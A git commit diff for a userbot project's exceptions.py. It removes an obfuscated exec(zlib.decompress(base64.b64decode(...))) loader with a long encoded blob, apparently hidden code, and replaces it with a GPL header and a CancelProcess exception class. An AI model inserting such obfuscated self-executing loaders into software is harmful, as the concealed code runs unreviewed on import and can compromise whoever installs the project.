8fd6d1524a83f90414d73f7fb41a2f63d660366e
X-Newbie <69149585+X-Newbie@users.noreply.github.com>
2020-10-02 22:14:47 +0700

    Update exceptions.py

--- userbot/utils/exceptions.py
+++ userbot/utils/exceptions.py
@@ -1,3 +1,18 @@
-import zlib
-import base64
-exec(zlib.decompress(base64.b64decode("eJyFkkGP2jAQhe/5FU/LhZUgoN0bXVVKKbCRWIiSoC1Hk0yIVWNHtgPl33cS2K7UQ+uLY8/M5/dmMsDcNFcrj7XHcP6Ip+nTFFFJP/EmWiW0CAbBAFny/cd4LQvSjsZxSdrLSpKdYZWsx8/hdGzsWAlPlnPzWjo01hytOIE/K0sEZyp/EZZmuJoWhdCwVErnrTy0niA9hC4nxuJkSlldGcNXrS7JwtcEJp8cTNUfVpsdVqTJCoWkPShZ4C4Ngl/ublxNJQ4dpitYdgqyuwIsDXOFl0aPQJLjFmeyjs94/njizhvBdI6GwneyLUzTlT2y1it6ux+VYd+lv51/GiwhdQ+uTcNuagayv4tUCgdC66hq1YgJnIv3OH/d7nJEmz3eozSNNvn+C+f62nCUznQjyVOjJIPZkxXaX1k6A94W6fyVK6Jv8TrO96wfyzjfLLIMy22KCEmU5vF8t45SJLs02WaLEBl1mojL/9Haqh8O968kL6RyN8t7nqZjYapELc7EUy1InlmWQMH/1f9HxgyhjD72Bjn3s4MhEFfQxo/gWOBL7X0zm0wul0t41G1o7HGibgw3+RoGQVAo4RzmQhekEmsKcm64+FXQbWizALweHh76ndctEffMP9HfNgsBOg==")))
+# Copyright (C) 2020 Adek Maulana
+#
+# SPDX-License-Identifier: GPL-3.0-or-later
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+class CancelProcess(Exception):
+    """Cancel Process"""
